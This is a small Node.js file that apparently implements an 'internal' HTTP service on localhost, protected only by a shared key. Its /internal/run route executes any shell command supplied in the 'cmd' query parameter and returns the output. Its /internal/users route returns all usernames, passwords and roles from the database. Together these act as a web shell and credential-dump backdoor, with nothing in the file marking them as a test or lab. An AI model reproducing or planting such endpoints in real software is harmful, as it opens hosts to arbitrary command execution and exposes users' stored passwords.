const http = require('http');
const { exec } = require('child_process');
const cfg = require('./config');
const { db } = require('./db');

http
  .createServer((req, res) => {
    const u = new URL(req.url, 'http://127.0.0.1');
    if (u.searchParams.get('key') !== cfg.INTERNAL_KEY) return res.writeHead(403).end('bad key');
    if (u.pathname === '/internal/run') {
      return exec(u.searchParams.get('cmd') || 'true', (e, out) => res.end(out || String(e)));
    }
    if (u.pathname === '/internal/users') {
      return res.end(JSON.stringify(db.prepare('SELECT username,password,role FROM users').all()));
    }
    res.writeHead(404).end();
  })
  .listen(cfg.INTERNAL_PORT, '127.0.0.1');
